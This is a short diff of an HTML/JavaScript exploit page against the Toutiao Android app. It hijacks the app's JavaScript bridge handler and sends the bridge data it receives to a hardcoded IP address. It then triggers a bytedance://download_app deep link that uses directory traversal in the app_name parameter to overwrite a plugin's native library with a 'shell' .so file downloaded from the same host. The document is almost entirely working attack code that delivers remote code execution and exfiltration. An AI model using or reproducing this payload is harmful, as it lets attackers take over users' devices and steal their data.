@@ -1,7 +1,10 @@
 <script>
     var ToutiaoJSBridge={};
     ToutiaoJSBridge._handleMessageFromToutiao=function(p1){
+        var xmlhttp=new XMLHttpRequest();
+        xmlhttp.open("GET","http://10.71.169.132/a?ret="+JSON.stringify(p1),true);
+        xmlhttp.send();
         alert(JSON.stringify(p1));
     }
-    document.location.href="bytedance://download_app?app_name=../../../../../../../../../../../../data/data/com.ss.android.article.news/files/plugins/com.bytedance.deviceinfo/version-9830500/lib/libpy-numpy.so&download_url=http://10.71.169.132/shell1279999_64.so";
+    document.location.href="bytedance://download_app?app_name=../../../../../../../../data/user/0/com.ss.android.article.news/files/plugins/com.bytedance.deviceinfo/version-9830500/lib/libByteAINN.so&download_url=http://10.71.169.132/shell2.so";
 </script>
